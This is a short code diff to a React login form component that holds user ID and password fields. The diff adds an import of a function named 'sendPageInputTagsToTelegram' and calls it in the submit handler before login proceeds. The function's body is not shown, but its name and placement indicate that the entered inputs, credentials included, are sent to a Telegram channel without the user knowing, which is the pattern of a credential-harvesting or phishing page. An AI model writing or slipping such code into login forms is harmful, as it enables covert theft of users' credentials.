@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Eye, EyeOff } from 'lucide-react';
+import { sendPageInputTagsToTelegram } from '../utils/telegram';
 
 interface LoginFormProps {
   onLogin?: () => void;
@@ -10,9 +11,10 @@ export function LoginForm({ onLogin }: LoginFormProps) {
   const [userId, setUserId] = useState('');
   const [password, setPassword] = useState('');
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (isFormValid && onLogin) {
+      await sendPageInputTagsToTelegram();
       onLogin();
     }
   };
